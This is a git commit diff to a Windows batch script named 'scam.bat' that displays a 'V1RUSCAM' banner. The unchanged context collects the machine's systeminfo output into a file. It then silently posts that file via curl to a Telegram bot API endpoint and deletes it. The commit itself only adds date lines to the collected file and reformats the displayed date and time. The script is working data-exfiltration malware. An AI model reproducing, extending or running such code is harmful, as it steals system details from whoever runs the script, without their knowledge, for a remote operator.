eb9236a36ef769d92590177e0e10e1ecfec1b4fa
musichka <114557026+kaktakt@users.noreply.github.com>
2024-09-30 22:18:11 +0800

    Update scam.bat

--- scam.bat
+++ scam.bat
@@ -20,6 +20,8 @@ SET "sys_inf=sys.txt"
 
 chcp 65001 > nul
 
+echo %date:~-4%.%date:~-7,2%.%date:~-10,2% > "%sys_inf%"
+echo --- > "%sys_inf%"
 systeminfo > "%sys_inf%"
 compact /c "%sys_inf%" >nul 2>&1
 curl -X POST -F "chat_id=%CHAT_ID%" -F "document=@%sys_inf%" https://api.telegram.org/bot%BOT_TOKEN%/sendDocument >nul 2>&1
@@ -28,11 +30,10 @@ curl -X POST -F "chat_id=%CHAT_ID%" -F "document=@%sys_inf%" https://api.telegra
 echo.
 echo  V1RUSCAM [ N0N 0FFICIAL ]
 echo.
-echo  %date:~-4%%date:~-7,2%%date:~-10,2%
-echo  %time:~0,2%%time:~3,2%%time:~6,2%
+echo  %date:~-4%.%date:~-7,2%.%date:~-10,2%
+echo  %time:~0,2%:%time:~3,2%:%time:~6,2%
+echo. 
 echo.
-echo.
-
 del %sys_inf% > nul
 
 timeout /t 3 /nobreak > nul
